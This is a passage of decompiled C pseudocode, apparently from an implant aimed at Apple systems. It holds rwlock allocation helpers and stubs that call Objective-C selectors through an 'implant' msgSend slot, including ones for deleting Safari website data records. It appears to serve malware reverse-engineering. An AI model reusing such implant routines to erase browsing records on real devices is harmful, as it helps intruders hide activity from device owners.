        *(uint *)(handle + 0x108) = size;
        u = *(uint *)(handle + 0xe8);
      }
      size = 0;
      *(uint *)(handle + 0xe8) = u + 1;
    }
    else {
      size = 0x7006;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_pthread_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr == (pthread_rwlock_t *)0x0) {
      u = 0xad009;
    }
    else {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        u = 0;
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
        u = 0xad020;
      }
    }
  }
  return u;
}





void coruna_ret_stub(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_URLWithString__00024540);
  return;
}





void coruna_ret_stub_2(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_allProfileIdentifiers_00024548);
  return;
}





void coruna_ret_stub_3(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_deleteSafariWebsiteDataRecord_co_00024550);
  return;
}





void coruna_ret_stub_4(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_ephemeralTabGroupManager_00024558);
  return;
}





void coruna_ret_stub_5(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_host_00024560);
  return;
}





void coruna_ret_stub_6(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_stringWithCString_encoding__00024568);
  return;
}





void coruna_ret_stub_7(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_websiteDataRecordWithDomain__00024570);
  return;
}





void coruna_ret_stub_8(uint64_t val)
{
  (*(void (*)k_implant_objc_msgsend_slot)(val,PTR_s_websiteDataRecordWithDomain_prof_00024578);
  return;
}

